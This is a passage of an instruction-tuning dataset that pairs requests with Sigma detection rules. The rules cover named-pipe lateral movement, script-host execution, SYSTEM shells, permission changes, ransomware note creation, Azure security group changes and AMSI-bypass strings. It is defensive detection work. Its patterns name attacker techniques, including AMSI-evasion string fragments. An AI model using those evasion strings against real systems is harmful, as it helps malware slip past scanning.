    "instruction": "Build a Sigma rule with the goal of detecting This detection excludes known namped pipes accessible remotely and notify on newly observed ones, may help to detect lateral movement and remote exec using named pipes.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect lateral movement and remote execution using named pipes, while excluding known named pipes that are accessible remotely to avoid false positives, you should focus on monitoring Windows security audit logs. Specifically, adjust the advanced audit policy setting for \"Object Access > Audit Detailed File Share\" to log both Success and Failure events. Look for events with an ID of 5145 that indicate an attempt to access the special IPC$ share, which is used for inter-process communication. This detection is crucial as unauthorized access to the IPC$ share might indicate an attempt for lateral movement or remote execution.\n\nHowever, to minimize false positives, it's important to exclude events related to access attempts on a list of known legitimate named pipes like 'atsvc', 'samr', 'lsarpc', 'lsass', 'winreg', 'netlogon', 'srvsvc', 'protected_storage', 'wkssvc', 'browser', 'netdfs', 'svcctl', 'spoolss', 'ntsvcs', 'LSM_API_service', 'HydraLsPipe', 'TermSrv_API_service', 'MsFteWds', 'sql\\\\query', and 'eventlog'. These named pipes are commonly used by legitimate processes and services for normal operations.\n\nTo further ensure accuracy, it's advised to periodically update the excluded named pipes list with any new legitimate named pipes observed, as this aids in maintaining an effective detection strategy that accurately identifies suspicious activities related to lateral movement and remote execution while minimizing false alarms. Detecting such activities is aligned with the tactics and techniques of lateral movement and execution, providing an important layer in defending against sophisticated attacks.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\n    definition: 'The advanced audit policy setting \"Object Access > Audit Detailed File Share\" must be configured for Success/Failure'\ndetection:\n    selection1:\n        EventID: 5145\n        ShareName: '\\\\\\\\\\*\\\\IPC$' # looking for the string \\\\*\\IPC$\n    false_positives:\n        RelativeTargetName:\n            - 'atsvc'\n            - 'samr'\n            - 'lsarpc'\n            - 'lsass'\n            - 'winreg'\n            - 'netlogon'\n            - 'srvsvc'\n            - 'protected_storage'\n            - 'wkssvc'\n            - 'browser'\n            - 'netdfs'\n            - 'svcctl'\n            - 'spoolss'\n            - 'ntsvcs'\n            - 'LSM_API_service'\n            - 'HydraLsPipe'\n            - 'TermSrv_API_service'\n            - 'MsFteWds'\n            - 'sql\\query'\n            - 'eventlog'\n    condition: selection1 and not false_positives\nfalsepositives:\n    - Update the excluded named pipe to filter out any newly observed legit named pipe\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\n    definition: 'The advanced audit policy setting \"Object Access > Audit Detailed File Share\" must be configured for Success/Failure'\ndetection:\n    selection1:\n        EventID: 5145\n        ShareName: '\\\\\\\\\\*\\\\IPC$' # looking for the string \\\\*\\IPC$\n    false_positives:\n        RelativeTargetName:\n            - 'atsvc'\n            - 'samr'\n            - 'lsarpc'\n            - 'lsass'\n            - 'winreg'\n            - 'netlogon'\n            - 'srvsvc'\n            - 'protected_storage'\n            - 'wkssvc'\n            - 'browser'\n            - 'netdfs'\n            - 'svcctl'\n            - 'spoolss'\n            - 'ntsvcs'\n            - 'LSM_API_service'\n            - 'HydraLsPipe'\n            - 'TermSrv_API_service'\n            - 'MsFteWds'\n            - 'sql\\query'\n            - 'eventlog'\n    condition: selection1 and not false_positives\nfalsepositives:\n    - Update the excluded named pipe to filter out any newly observed legit named pipe\nlevel: high\n",
      "question": "This detection excludes known namped pipes accessible remotely and notify on newly observed ones, may help to detect lateral movement and remote exec using named pipes",
      "answer": "In order to detect lateral movement and remote execution using named pipes, while excluding known named pipes that are accessible remotely to avoid false positives, you should focus on monitoring Windows security audit logs. Specifically, adjust the advanced audit policy setting for \"Object Access > Audit Detailed File Share\" to log both Success and Failure events. Look for events with an ID of 5145 that indicate an attempt to access the special IPC$ share, which is used for inter-process communication. This detection is crucial as unauthorized access to the IPC$ share might indicate an attempt for lateral movement or remote execution.\n\nHowever, to minimize false positives, it's important to exclude events related to access attempts on a list of known legitimate named pipes like 'atsvc', 'samr', 'lsarpc', 'lsass', 'winreg', 'netlogon', 'srvsvc', 'protected_storage', 'wkssvc', 'browser', 'netdfs', 'svcctl', 'spoolss', 'ntsvcs', 'LSM_API_service', 'HydraLsPipe', 'TermSrv_API_service', 'MsFteWds', 'sql\\\\query', and 'eventlog'. These named pipes are commonly used by legitimate processes and services for normal operations.\n\nTo further ensure accuracy, it's advised to periodically update the excluded named pipes list with any new legitimate named pipes observed, as this aids in maintaining an effective detection strategy that accurately identifies suspicious activities related to lateral movement and remote execution while minimizing false alarms. Detecting such activities is aligned with the tactics and techniques of lateral movement and execution, providing an important layer in defending against sophisticated attacks."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting wscript/cscript executions of scripts located in user directories.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect wscript/cscript executions of scripts located in user directories, you should look for the creation of processes on Windows systems that manifest a specific pattern in their execution. These processes are initiated by the Windows Script Host engines, wscript.exe or cscript.exe, indicating the use of Windows scripting. The identifiers to watch out for include these engines launching scripts present within either 'C:\\Users\\' or 'C:\\ProgramData\\' directories.\n\nMoreover, the command lines initiating these processes may have references to file types like .jse, .vbe, .js, .vba, or .vbs, which are all script formats that can potentially be used for malicious purposes when executed in such a context. This combination of factors\u2014script host engines executing scripts from user directories in specific script formats\u2014is indicative of suspicious activity potentially related to scripting attacks.\n\nHowever, it's crucial to consider exceptions to rule out false positives effectively. If the process lineage (ParentImage) includes utilities like Winzip or other self-extractors, which might legitimately execute scripts as part of their operation, such instances should not be considered malicious.\n\nThe data crucial for this analysis includes the CommandLine and ParentCommandLine, which provide context on how and why a particular script is being executed. Being vigilant about such process creation events is critical, although it's also necessary to be aware of common benign software operations (like those involving Winzip) to avoid misinterpreting legitimate activities as threats.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        Image|endswith:\n            - '\\wscript.exe'\n            - '\\cscript.exe'\n        CommandLine|contains:\n            - 'C:\\Users\\'\n            - 'C:\\ProgramData\\'\n    selection2:\n        CommandLine|contains:\n            - '.jse'\n            - '.vbe'\n            - '.js'\n            - '.vba'\n            - '.vbs'\n    falsepositive:\n        ParentImage|contains: '\\winzip'\n    condition: selection1 and selection2 and not falsepositive\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Winzip\n    - Other self-extractors\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        Image|endswith:\n            - '\\wscript.exe'\n            - '\\cscript.exe'\n        CommandLine|contains:\n            - 'C:\\Users\\'\n            - 'C:\\ProgramData\\'\n    selection2:\n        CommandLine|contains:\n            - '.jse'\n            - '.vbe'\n            - '.js'\n            - '.vba'\n            - '.vbs'\n    falsepositive:\n        ParentImage|contains: '\\winzip'\n    condition: selection1 and selection2 and not falsepositive\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Winzip\n    - Other self-extractors\nlevel: high\n",
      "question": "wscript/cscript executions of scripts located in user directories",
      "answer": "In order to detect wscript/cscript executions of scripts located in user directories, you should look for the creation of processes on Windows systems that manifest a specific pattern in their execution. These processes are initiated by the Windows Script Host engines, wscript.exe or cscript.exe, indicating the use of Windows scripting. The identifiers to watch out for include these engines launching scripts present within either 'C:\\Users\\' or 'C:\\ProgramData\\' directories.\n\nMoreover, the command lines initiating these processes may have references to file types like .jse, .vbe, .js, .vba, or .vbs, which are all script formats that can potentially be used for malicious purposes when executed in such a context. This combination of factors\u2014script host engines executing scripts from user directories in specific script formats\u2014is indicative of suspicious activity potentially related to scripting attacks.\n\nHowever, it's crucial to consider exceptions to rule out false positives effectively. If the process lineage (ParentImage) includes utilities like Winzip or other self-extractors, which might legitimately execute scripts as part of their operation, such instances should not be considered malicious.\n\nThe data crucial for this analysis includes the CommandLine and ParentCommandLine, which provide context on how and why a particular script is being executed. Being vigilant about such process creation events is critical, although it's also necessary to be aware of common benign software operations (like those involving Winzip) to avoid misinterpreting legitimate activities as threats."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting shell program such as the Windows command prompt or PowerShell is launched with system privileges..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when a shell program such as the Windows command prompt or PowerShell is launched with system privileges, you should monitor Windows process creation logs for evidence of shell programs being initiated with elevated privileges. Specifically, look for instances where known shell executable names like `powershell.exe`, `pwsh.exe`, or `cmd.exe` are recorded in the process image paths. These shell programs might also be identified by their original file names, such as `PowerShell.EXE`, `pwsh.dll`, or `Cmd.Exe`.\n\nAdditionally, scrutinize user-related attributes in the logs, especially when the user name contains variants of 'AUTHORI' or 'AUTORI', or when the Logon ID is '0x3e7', indicating system-level privileges. \n\nExclude any records that match certain patterns suggesting legitimate use of shell programs under supervised circumstances, such as processes spawned by system directories (`C:\\Windows\\System32\\`, `C:\\Program Files (x86)\\`, or `C:\\Program Files\\`), or specific known parent processes like those related to ManageEngine services, Citrix updates, Asgard agents, Dell updates, compatibility telemetry (CompatTelRunner.exe), IBM SpectrumProtect scripts, Windows Installer services (`msiexec.exe`), and some cases of command execution without a parent process that are known to be benign or part of routine operations. \n\nThis approach helps in pinpointing suspicious activities while striving to minimize false alarms by excluding known patterns of legitimate usage. The detection should be tagged with relevant MITRE ATT&CK tactics and techniques, such as Execution, Privilege Escalation, and Defense Evasion, acknowledging the use of shell programs to perform malicious activities with elevated permissions.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_shell:\n        - Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\cmd.exe'\n        - OriginalFileName:\n            - 'PowerShell.EXE'\n            - 'pwsh.dll'\n            - 'Cmd.Exe'\n    selection_user:\n        User|contains: # covers many language settings\n            - 'AUTHORI'\n            - 'AUTORI'\n        LogonId: '0x3e7'\n    filter_generic:\n        # Example 1:\n        #   C:\\Program Files\\erl-23.2\\erts-11.1.4\\bin\\erl.exe\" -service_event ErlSrv_RabbitMQ -nohup -sname rabbit@localhost -s rabbit boot -boot start_sasl +W w +MBas ageffcbf +MHas ageffcbf +MBlmbcs 512 +MHlmbcs 512 +MMmcs 30 +P 1048576 +t 5000000 +stbt db +zdbbl 128000 +sbwt none +sbwtdcpu none +sbwtdio none -kernel inet_dist_listen_min 25672 -kernel inet_dist_listen_max 25672 -lager crash_log false -lager handlers []\n        # Example 2:\n        #   ParentImage: C:\\Program Files (x86)\\Varonis\\DatAdvantage\\GridCollector\\VrnsRealTimeAlertsSvc.exe\" /appid 000000ad-cb03-500b-9459-c46d000000ad\n        #   CommandLine: C:\\Windows\\system32\\cmd.exe /c C:\\Program Files \"(x86)\\Varonis\\DatAdvantage\\GridCollector\\handle_scopes.cmd C:\\Collector\" Working Share\\VaronisWorkDirectoryCollector\n        ParentImage|startswith:\n            - 'C:\\Windows\\System32\\'\n            - 'C:\\Program Files (x86)\\'\n            - 'C:\\Program Files\\'\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\powershell.exe'\n    filter_manageengine:\n        # Example:\n        #   ParentImage: C:/ManageEngine/ADManager Plus/pgsql/bin/postgres.exe\" --forkarch 5380\n        #   CommandLine: C:\\Windows\\system32\\cmd.exe /c \"IF EXIST archive.bat (archive.bat pg_wal\\000000010000008E000000EA 000000010000008E000000EA)\n        ParentImage: 'C:\\ManageEngine\\ADManager Plus\\pgsql\\bin\\postgres.exe'\n        Image|endswith: '\\cmd.exe'\n    filter_citrix:\n        ParentImage|startswith: 'C:\\Windows\\SysWOW64\\config\\systemprofile\\Citrix\\UpdaterBinaries\\'\n        ParentImage|endswith: '\\CitrixReceiverUpdater.exe'\n        Image|endswith: '\\cmd.exe'\n    filter_asgard:\n        CommandLine|startswith: 'C:\\WINDOWS\\system32\\cmd.exe /c \"'\n        CurrentDirectory|contains: 'C:\\WINDOWS\\Temp\\asgard2-agent\\'\n    filter_dell_update:\n        ParentImage|startswith: 'C:\\Windows\\Temp'\n        ParentImage|endswith: '\\invcol.exe'\n        ParentCommandLine|contains: 'C:\\ProgramData\\Dell\\UpdateService\\'\n        Image|endswith: '\\cmd.exe'\n    filter_compattelrunner: # seen on Windows 8\n        ParentImage|startswith: 'C:\\Windows\\WinSxS\\'\n        ParentImage|endswith: '\\CompatTelRunner.exe'\n        ParentCommandLine|startswith: 'C:\\Windows\\system32\\CompatTelRunner.exe -m:appraiser.dll -f:DoScheduledTelemetryRun'\n    filter_ibm_spectrumprotect:\n        ParentImage|startswith: 'C:\\IBM\\SpectrumProtect\\webserver\\scripts\\'\n        CommandLine|contains: 'C:\\IBM\\SpectrumProtect\\webserver\\scripts\\'\n    filter_msiexec:\n        ParentImage: 'C:\\Windows\\SysWOW64\\msiexec.exe'\n        ParentCommandLine|startswith: 'C:\\Windows\\syswow64\\MsiExec.exe -Embedding'\n        CommandLine|contains: '\\RegisterMicrosoftUpdate.ps1'\n    filter_empty_parent_1:\n        CommandLine: \"powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';\"  # Most probably SetupHost.exe during Windows updates/upgrades; See comment on rule id: f4bbd493-b796-416e-bbf2-121235348529\n    filter_empty_parent_2:\n        Image|endswith: '\\cmd.exe'\n        CommandLine|contains: '/d /c C:\\Windows\\system32\\silcollector.cmd'\n    filter_empty_parent_3:\n        Image|endswith: '\\cmd.exe'\n        CommandLine|endswith:\n            - 'cmd.exe /c btool server list replication_port --no-log'\n            - 'cmd.exe /c btool server list general --no-log'\n    filter_empty_parent_4: # seen on an SCCM server\n        Image|endswith: '\\cmd.exe'\n        CommandLine|contains: 'C:\\Windows\\system32\\reg.exe query hklm\\software\\microsoft\\windows\\softwareinventorylogging /v collectionstate /reg:64'\n    filter_empty_parent_5:\n        Image: 'C:\\Windows\\System32\\cmd.exe'\n        CommandLine: 'C:\\Windows\\system32\\cmd.exe /c PAUSE'\n    condition: all of selection_* and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_shell:\n        - Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\cmd.exe'\n        - OriginalFileName:\n            - 'PowerShell.EXE'\n            - 'pwsh.dll'\n            - 'Cmd.Exe'\n    selection_user:\n        User|contains: # covers many language settings\n            - 'AUTHORI'\n            - 'AUTORI'\n        LogonId: '0x3e7'\n    filter_generic:\n        # Example 1:\n        #   C:\\Program Files\\erl-23.2\\erts-11.1.4\\bin\\erl.exe\" -service_event ErlSrv_RabbitMQ -nohup -sname rabbit@localhost -s rabbit boot -boot start_sasl +W w +MBas ageffcbf +MHas ageffcbf +MBlmbcs 512 +MHlmbcs 512 +MMmcs 30 +P 1048576 +t 5000000 +stbt db +zdbbl 128000 +sbwt none +sbwtdcpu none +sbwtdio none -kernel inet_dist_listen_min 25672 -kernel inet_dist_listen_max 25672 -lager crash_log false -lager handlers []\n        # Example 2:\n        #   ParentImage: C:\\Program Files (x86)\\Varonis\\DatAdvantage\\GridCollector\\VrnsRealTimeAlertsSvc.exe\" /appid 000000ad-cb03-500b-9459-c46d000000ad\n        #   CommandLine: C:\\Windows\\system32\\cmd.exe /c C:\\Program Files \"(x86)\\Varonis\\DatAdvantage\\GridCollector\\handle_scopes.cmd C:\\Collector\" Working Share\\VaronisWorkDirectoryCollector\n        ParentImage|startswith:\n            - 'C:\\Windows\\System32\\'\n            - 'C:\\Program Files (x86)\\'\n            - 'C:\\Program Files\\'\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\powershell.exe'\n    filter_manageengine:\n        # Example:\n        #   ParentImage: C:/ManageEngine/ADManager Plus/pgsql/bin/postgres.exe\" --forkarch 5380\n        #   CommandLine: C:\\Windows\\system32\\cmd.exe /c \"IF EXIST archive.bat (archive.bat pg_wal\\000000010000008E000000EA 000000010000008E000000EA)\n        ParentImage: 'C:\\ManageEngine\\ADManager Plus\\pgsql\\bin\\postgres.exe'\n        Image|endswith: '\\cmd.exe'\n    filter_citrix:\n        ParentImage|startswith: 'C:\\Windows\\SysWOW64\\config\\systemprofile\\Citrix\\UpdaterBinaries\\'\n        ParentImage|endswith: '\\CitrixReceiverUpdater.exe'\n        Image|endswith: '\\cmd.exe'\n    filter_asgard:\n        CommandLine|startswith: 'C:\\WINDOWS\\system32\\cmd.exe /c \"'\n        CurrentDirectory|contains: 'C:\\WINDOWS\\Temp\\asgard2-agent\\'\n    filter_dell_update:\n        ParentImage|startswith: 'C:\\Windows\\Temp'\n        ParentImage|endswith: '\\invcol.exe'\n        ParentCommandLine|contains: 'C:\\ProgramData\\Dell\\UpdateService\\'\n        Image|endswith: '\\cmd.exe'\n    filter_compattelrunner: # seen on Windows 8\n        ParentImage|startswith: 'C:\\Windows\\WinSxS\\'\n        ParentImage|endswith: '\\CompatTelRunner.exe'\n        ParentCommandLine|startswith: 'C:\\Windows\\system32\\CompatTelRunner.exe -m:appraiser.dll -f:DoScheduledTelemetryRun'\n    filter_ibm_spectrumprotect:\n        ParentImage|startswith: 'C:\\IBM\\SpectrumProtect\\webserver\\scripts\\'\n        CommandLine|contains: 'C:\\IBM\\SpectrumProtect\\webserver\\scripts\\'\n    filter_msiexec:\n        ParentImage: 'C:\\Windows\\SysWOW64\\msiexec.exe'\n        ParentCommandLine|startswith: 'C:\\Windows\\syswow64\\MsiExec.exe -Embedding'\n        CommandLine|contains: '\\RegisterMicrosoftUpdate.ps1'\n    filter_empty_parent_1:\n        CommandLine: \"powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';\"  # Most probably SetupHost.exe during Windows updates/upgrades; See comment on rule id: f4bbd493-b796-416e-bbf2-121235348529\n    filter_empty_parent_2:\n        Image|endswith: '\\cmd.exe'\n        CommandLine|contains: '/d /c C:\\Windows\\system32\\silcollector.cmd'\n    filter_empty_parent_3:\n        Image|endswith: '\\cmd.exe'\n        CommandLine|endswith:\n            - 'cmd.exe /c btool server list replication_port --no-log'\n            - 'cmd.exe /c btool server list general --no-log'\n    filter_empty_parent_4: # seen on an SCCM server\n        Image|endswith: '\\cmd.exe'\n        CommandLine|contains: 'C:\\Windows\\system32\\reg.exe query hklm\\software\\microsoft\\windows\\softwareinventorylogging /v collectionstate /reg:64'\n    filter_empty_parent_5:\n        Image: 'C:\\Windows\\System32\\cmd.exe'\n        CommandLine: 'C:\\Windows\\system32\\cmd.exe /c PAUSE'\n    condition: all of selection_* and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "shell program such as the Windows command prompt or PowerShell is launched with system privileges.",
      "answer": "In order to detect when a shell program such as the Windows command prompt or PowerShell is launched with system privileges, you should monitor Windows process creation logs for evidence of shell programs being initiated with elevated privileges. Specifically, look for instances where known shell executable names like `powershell.exe`, `pwsh.exe`, or `cmd.exe` are recorded in the process image paths. These shell programs might also be identified by their original file names, such as `PowerShell.EXE`, `pwsh.dll`, or `Cmd.Exe`.\n\nAdditionally, scrutinize user-related attributes in the logs, especially when the user name contains variants of 'AUTHORI' or 'AUTORI', or when the Logon ID is '0x3e7', indicating system-level privileges. \n\nExclude any records that match certain patterns suggesting legitimate use of shell programs under supervised circumstances, such as processes spawned by system directories (`C:\\Windows\\System32\\`, `C:\\Program Files (x86)\\`, or `C:\\Program Files\\`), or specific known parent processes like those related to ManageEngine services, Citrix updates, Asgard agents, Dell updates, compatibility telemetry (CompatTelRunner.exe), IBM SpectrumProtect scripts, Windows Installer services (`msiexec.exe`), and some cases of command execution without a parent process that are known to be benign or part of routine operations. \n\nThis approach helps in pinpointing suspicious activities while striving to minimize false alarms by excluding known patterns of legitimate usage. The detection should be tagged with relevant MITRE ATT&CK tactics and techniques, such as Execution, Privilege Escalation, and Defense Evasion, acknowledging the use of shell programs to perform malicious activities with elevated permissions."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting file and folder permission changes..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect file and folder permission changes, you should: Monitor logs generated by the Auditd service on Linux systems for execution (EXECVE) events where the command executed involves changing file or folder permissions or ownership. Specifically, look for instances where the command includes 'chmod' or 'chown', as these are indicative of attempts to modify the permissions or ownership of files and folders. It's important to note that changes to file and folder permissions and ownership are common in both benign and malicious activities. Therefore, occurrences of these commands might not always signify an attack, and can often be a part of regular system maintenance or user interactions with file permissions. Hence, while monitoring for these commands, it's essential to consider the context in which they are used to differentiate between normal behavior and potential security threats. The detection of such activities has been categorized with a low level of alert due to the possibility of false positives, which include regular user interactions with file permissions.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\n    service: auditd\ndetection:\n    selection:\n        type: 'EXECVE'\n        a0|contains:\n            - 'chmod'\n            - 'chown'\n    condition: selection\nfalsepositives:\n    - User interacting with files permissions (normal/daily behaviour).\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\n    service: auditd\ndetection:\n    selection:\n        type: 'EXECVE'\n        a0|contains:\n            - 'chmod'\n            - 'chown'\n    condition: selection\nfalsepositives:\n    - User interacting with files permissions (normal/daily behaviour).\nlevel: low\n",
      "question": "file and folder permission changes.",
      "answer": "In order to detect file and folder permission changes, you should: Monitor logs generated by the Auditd service on Linux systems for execution (EXECVE) events where the command executed involves changing file or folder permissions or ownership. Specifically, look for instances where the command includes 'chmod' or 'chown', as these are indicative of attempts to modify the permissions or ownership of files and folders. It's important to note that changes to file and folder permissions and ownership are common in both benign and malicious activities. Therefore, occurrences of these commands might not always signify an attack, and can often be a part of regular system maintenance or user interactions with file permissions. Hence, while monitoring for these commands, it's essential to consider the context in which they are used to differentiate between normal behavior and potential security threats. The detection of such activities has been categorized with a low level of alert due to the possibility of false positives, which include regular user interactions with file permissions."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Ransomware create txt file in the user Desktop.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a ransomware attempt to create a txt file on the user's desktop, you should: Monitor Windows file events specifically looking for instances where the command prompt (cmd.exe) is involved in creating files. Pay special attention to files that have a '.txt' extension and are located within the Desktop directory of any user profile. The detection framework should raise an alert at a high level when these specific conditions are met, indicating a possible ransomware activity. This monitoring strategy relies on the premise that legitimate software and user activities seldom use the command prompt to create text files on the desktop, making this behavior suspicious and worth investigating further.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        Image|endswith: '\\cmd.exe'\n        TargetFilename|contains|all:\n            - '\\Users\\'\n            - '\\Desktop\\'\n        TargetFilename|endswith: '.txt'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        Image|endswith: '\\cmd.exe'\n        TargetFilename|contains|all:\n            - '\\Users\\'\n            - '\\Desktop\\'\n        TargetFilename|endswith: '.txt'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "Ransomware create txt file in the user Desktop",
      "answer": "In order to detect a ransomware attempt to create a txt file on the user's desktop, you should: Monitor Windows file events specifically looking for instances where the command prompt (cmd.exe) is involved in creating files. Pay special attention to files that have a '.txt' extension and are located within the Desktop directory of any user profile. The detection framework should raise an alert at a high level when these specific conditions are met, indicating a possible ransomware activity. This monitoring strategy relies on the premise that legitimate software and user activities seldom use the command prompt to create text files on the desktop, making this behavior suspicious and worth investigating further."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting application security group is modified or deleted..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to identify when an application security group is modified or deleted, you should monitor Azure activity logs for signs of unauthorized or suspicious modifications or deletions of application security groups. Specifically, look for operations named MICROSOFT.NETWORK/APPLICATIONSECURITYGROUPS/WRITE and MICROSOFT.NETWORK/APPLICATIONSECURITYGROUPS/DELETE. These operations indicate that an application security group has either been modified or deleted. It\u2019s crucial to assess the context of these actions. Normally, system administrators perform these operations as part of legitimate maintenance or configuration tasks. Therefore, it's important to verify the user identity, user agent, and hostname involved in these operations to ensure they align with expected activities within your environment. Unauthorized modifications or deletions can serve as indicators of malicious activity, possibly indicating a threat actor's attempt to alter security controls to bypass network security measures. Investigate any modifications or deletions carried out by unfamiliar users, as these are more likely to indicate malicious activity. If certain activities are causing false positives because they are known and legitimate behaviors within your environment, you may consider exempting them from monitoring under this criterion to enhance the accuracy of your detection efforts. This proactive approach helps in maintaining the integrity and security of your network infrastructure by promptly identifying and responding to unauthorized changes in application security groups.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: azure\n    service: activitylogs\ndetection:\n    selection:\n        operationName:\n            - MICROSOFT.NETWORK/APPLICATIONSECURITYGROUPS/WRITE\n            - MICROSOFT.NETWORK/APPLICATIONSECURITYGROUPS/DELETE\n    condition: selection\nfalsepositives:\n    - Application security group being modified or deleted may be performed by a system administrator.\n    - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment.\n    - Application security group modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule.\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: azure\n    service: activitylogs\ndetection:\n    selection:\n        operationName:\n            - MICROSOFT.NETWORK/APPLICATIONSECURITYGROUPS/WRITE\n            - MICROSOFT.NETWORK/APPLICATIONSECURITYGROUPS/DELETE\n    condition: selection\nfalsepositives:\n    - Application security group being modified or deleted may be performed by a system administrator.\n    - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment.\n    - Application security group modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule.\nlevel: medium\n",
      "question": "application security group is modified or deleted.",
      "answer": "In order to identify when an application security group is modified or deleted, you should monitor Azure activity logs for signs of unauthorized or suspicious modifications or deletions of application security groups. Specifically, look for operations named MICROSOFT.NETWORK/APPLICATIONSECURITYGROUPS/WRITE and MICROSOFT.NETWORK/APPLICATIONSECURITYGROUPS/DELETE. These operations indicate that an application security group has either been modified or deleted. It\u2019s crucial to assess the context of these actions. Normally, system administrators perform these operations as part of legitimate maintenance or configuration tasks. Therefore, it's important to verify the user identity, user agent, and hostname involved in these operations to ensure they align with expected activities within your environment. Unauthorized modifications or deletions can serve as indicators of malicious activity, possibly indicating a threat actor's attempt to alter security controls to bypass network security measures. Investigate any modifications or deletions carried out by unfamiliar users, as these are more likely to indicate malicious activity. If certain activities are causing false positives because they are known and legitimate behaviors within your environment, you may consider exempting them from monitoring under this criterion to enhance the accuracy of your detection efforts. This proactive approach helps in maintaining the integrity and security of your network infrastructure by promptly identifying and responding to unauthorized changes in application security groups."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting usage of special strings/null bits in order to potentially bypass AMSI functionalities.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect usage of special strings/null bits in order to potentially bypass AMSI functionalities, you should: look for PowerShell script actions on Windows systems where Script Block Logging is enabled. Specifically, focus on identifying PowerShell commands that contain peculiar patterns such as \"if(0){{{0}}}' -f $(0 -as [char]) +\" or the representation of null bits through \"#<NULL>\". These patterns are unusual and may suggest an attempt to circumvent Anti-Malware Software Interface (AMSI) checks, which are designed to scan scripts and other code in memory for malware. Be aware that while these indicators can point to potential bypass attempts, not all uses may be malicious in nature, leading to possible unknown false positives. The significance of detecting these patterns is considered to be of medium level, indicating a noteworthy but not definitive sign of attempted evasion or malicious activity.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains:\n            - \"if(0){{{0}}}' -f $(0 -as [char]) +\"\n            - \"#<NULL>\"\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains:\n            - \"if(0){{{0}}}' -f $(0 -as [char]) +\"\n            - \"#<NULL>\"\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "usage of special strings/null bits in order to potentially bypass AMSI functionalities",
      "answer": "In order to detect usage of special strings/null bits in order to potentially bypass AMSI functionalities, you should: look for PowerShell script actions on Windows systems where Script Block Logging is enabled. Specifically, focus on identifying PowerShell commands that contain peculiar patterns such as \"if(0){{{0}}}' -f $(0 -as [char]) +\" or the representation of null bits through \"#<NULL>\". These patterns are unusual and may suggest an attempt to circumvent Anti-Malware Software Interface (AMSI) checks, which are designed to scan scripts and other code in memory for malware. Be aware that while these indicators can point to potential bypass attempts, not all uses may be malicious in nature, leading to possible unknown false positives. The significance of detecting these patterns is considered to be of medium level, indicating a noteworthy but not definitive sign of attempted evasion or malicious activity."
    }
  },
  {
